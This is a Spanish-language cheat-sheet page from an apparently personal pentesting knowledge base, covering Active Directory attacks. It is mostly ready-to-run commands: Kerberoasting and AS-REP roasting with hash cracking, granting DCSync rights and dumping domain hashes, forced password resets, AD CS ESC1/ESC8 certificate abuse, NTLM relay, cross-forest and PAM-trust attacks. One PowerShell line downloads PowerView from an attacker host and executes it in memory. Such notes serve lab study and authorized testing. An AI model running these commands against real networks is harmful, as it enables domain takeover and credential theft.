---
title: Active Directory Attacks
slug: active-directory-attacks
category: techniques
updated: 2026-07-01
summary: "BloodHound/cypher, DCSync, ACL abuse, AD CS ESC1, cross-forest, PAM trust"
tags: [ad, bloodhound, dcsync, acl, adcs, esc1, kerberoast, asrep, cross-forest, pam-trust]
sensitive: false
---

# Active Directory Attacks

## When to use
Post-acceso inicial con credenciales de dominio. Árbol de decisión → luego ejecutar ataque específico.

## Árbol de decisión AD
```
Sin creds
├── LDAP anónimo → description/info/comment → creds
├── SMB null/guest → shares → archivos con creds
├── RID brute → lista usuarios → spray
└── AS-REP Roast → usuarios sin preauth

Con creds de dominio
├── BloodHound → paths → WriteDACL / GenericAll / ForceChangePassword
├── Kerberoasting → SPNs con hash débil → crack
├── AD CS → certipy-ad find -vulnerable → ESC1..ESC8
├── MSSQL/Servicios → forced auth (xp_dirtree) → NTLMv2 → crack
└── Password reuse → spray en todos los protocolos (ver netexec-crackmapexec)

Con hash/cert de admin
└── PTH evil-winrm → DCSync → golden ticket
```

## BloodHound — recolección + queries clave
```bash
# Recolección desde Linux
bloodhound-python -u USER -p PASS -d DOMAIN -ns DC_IP -c All --zip

# Recolección desde Windows (SharpHound)
.\SharpHound.exe -c All -d DOMAIN --zipfilename bh.zip
```

### Cypher queries útiles en Neo4j
```cypher
-- Path más corto a DA desde un usuario
MATCH p=shortestPath((u:User {name:"USER@DOMAIN"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN"})) RETURN p

-- Qué puede hacer un usuario
MATCH (u:User {name:"USER@DOMAIN"})-[r]->(n) RETURN u,r,n

-- Grupos del usuario
MATCH (u:User {name:"USER@DOMAIN"})-[:MemberOf*1..]->(g:Group) RETURN g.name

-- Todos los Kerberoastable con path a DA
MATCH p=shortestPath((u:User {hasspn:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN"})) RETURN p

-- Usuarios con AS-REP Roasting habilitado
MATCH (u:User {dontreqpreauth:true}) RETURN u.name

-- Objetos con WriteDACL / GenericAll sobre el DC
MATCH (n)-[:WriteDacl|GenericAll]->(c:Computer {name:"DC01.DOMAIN"}) RETURN n.name
```

## Kerberoasting
```bash
# Linux
impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request -outputfile kerb.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt --force

# Windows (Rubeus)
.\Rubeus.exe kerberoast /nowrap
.\Rubeus.exe kerberoast /domain:EXTERNAL.LOCAL /user:svc /nowrap   # cross-forest

# Targeted Kerberoast (abusa WriteProperty/WriteSPN sobre cuenta sin SPN)
python3 targetedKerberoast.py -u USER -p PASS -d DOMAIN --dc-ip DC_IP
```

## AS-REP Roasting
```bash
impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -no-pass -usersfile users.txt -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force
# Con credenciales:
impacket-GetNPUsers DOMAIN/USER:PASS -dc-ip DC_IP -request -format hashcat
```

## DCSync (via WriteDACL)
```bash
# Añadir permisos DCSync a usuario controlado (desde Windows con PowerView):
IEX(New-Object Net.WebClient).DownloadString('http://KALI/PowerView.ps1')
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\USER', (ConvertTo-SecureString 'PASS' -AsPlainText -Force))
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity USER -Rights DCSync -Verbose

# Desde Linux:
dacledit.py -action write -rights DCSync -principal USER -target 'DC=domain,DC=local' 'DOMAIN/USER:PASS'

# Dump DCSync:
impacket-secretsdump 'DOMAIN/USER:PASS@DC_IP' -just-dc-ntlm
impacket-secretsdump 'DOMAIN/USER:PASS@DC_IP' -just-dc-user Administrator
```

## ACL Abuse — cadena de privilegios
```bash
# ForceChangePassword:
bloodyAD -u USER -p PASS -d DOMAIN --dc-ip DC_IP set password TARGET 'Hacked123!'
# GenericAll / WriteDACL:
dacledit.py -action write -rights FullControl -principal USER -target TARGET 'DOMAIN/USER:PASS'
# Verificar ACL de un usuario:
python3 dacledit.py -principal USER -target TARGETUSER -dc-ip DC_IP DOMAIN/USER:PASS
```
- **Write sobre un objeto Computer (esp. el DC) → RBCD → DA.** Ver [[rbcd-to-domain-admin]]
  para el flujo completo (addcomputer → rbcd write → getST S4U → secretsdump).
- **Sin creds al inicio:** [[ad-credential-looting]] (SMB null/guest, atributos LDAP
  info/description, creds hardcodeadas en binarios .NET).

## AD Certificate Services (AD CS)
```bash
# Enumerar templates vulnerables
certipy-ad find -u USER@DOMAIN -p PASS -dc-ip DC_IP -vulnerable -stdout

# ESC1: EnrolleeSuppliesSubject + Client Auth + enrollment rights
certipy-ad req -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA-NAME -template TEMPLATE -upn administrator@DOMAIN -out admin

# Obtener hash NTLM del certificado
certipy-ad auth -pfx admin.pfx -dc-ip DC_IP
# Output: administrator@domain: aad3...:NTHASH

# ESC8: NTLM relay a AD CS HTTP endpoint
ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template User
```

## Cross-Forest Attacks
```bash
# Kerberoast cross-forest (via trust bidireccional)
impacket-GetUserSPNs DOMAIN/Administrator -hashes :NTHASH \
  -target-domain EXTERNAL.LOCAL -dc-ip EXTERNAL_DC_IP -request

# Usuarios de forest externo en grupos locales
Get-DomainForeignGroupMember -Domain EXTERNAL.LOCAL   # PowerView

# Admin password reuse cross-forest → spray
nxc smb EXTERNAL_DC_IP -u Administrator -H NTHASH
```

## PAM Trust Abuse (bastion forest)
```powershell
# Enumerar shadow principals en bastion forest
Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) `
  -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid

# Si el bastion forest está comprometido y tiene shadow principal con Enterprise Admins SID del user forest:
ls \\DC-USER.userfore.corp\c$   # acceso directo como admin
```

## AD Auditing / Enumeración avanzada
```bash
# rpcclient (null session o con creds)
rpcclient -U "" DC_IP -N
  > enumdomusers; enumdomgroups; netshareenum

# ldapsearch — buscar creds en description/info/comment (y en deleted objects)
ldapsearch -x -H ldap://DC_IP -b "DC=DOMAIN,DC=local" \
  "(objectClass=user)" sAMAccountName description info comment

# PingCastle — health check del dominio (ejecutar desde Windows unido al dominio)
PingCastle.exe --healthcheck

# Group3r — vulnerabilidades en GPOs
group3r.exe -f output.log

# ADRecon — dump masivo de AD a CSV/HTML
.\ADRecon.ps1

# AD Explorer — snapshot offline del AD (SysInternals)
# File → Create Snapshot → mover para análisis offline
```

## Gotchas
- `sudo ntpdate DC_IP` SIEMPRE antes de operaciones Kerberos — clock skew de 7h da KRB_AP_ERR_SKEW.
- Lockout típico AD: 5 intentos / 30 min → spray con UNA password a todos los usuarios, no al revés.
- `certipy-ad` (no `certipy`) — la versión antigua no reconoce algunos argumentos.
- Cross-forest Kerberoast: `--target-domain` da "name resolution failure" si no tienes ruta de red al DC externo.
- AdminSDHolder revierte ACLs a cuentas con adminCount=1 cada 60 min — úsalas como ORIGEN de ACL, no destino.
- SMB signing requerido (muchos DCs) → no relay posible, PTH sí.
- ESC1: verificar que el usuario controlado tiene enrollment rights sobre el template vulnerable.
- SID History cross-forest: solo funciona si SID Filtering está deshabilitado en el trust.

## References
- Relacionado: [[netexec-crackmapexec]], [[password-spray]], [[password-cracking]], [[network-pivoting]], [[privilege-escalation]], [[service-enumeration]], [[gtfobins-binaries]]
- Notas internas de labs de AD (Kerberoast, DCSync, ACL/ADCS).
- Notas de estudio.
- Módulos de Enterprise AD.
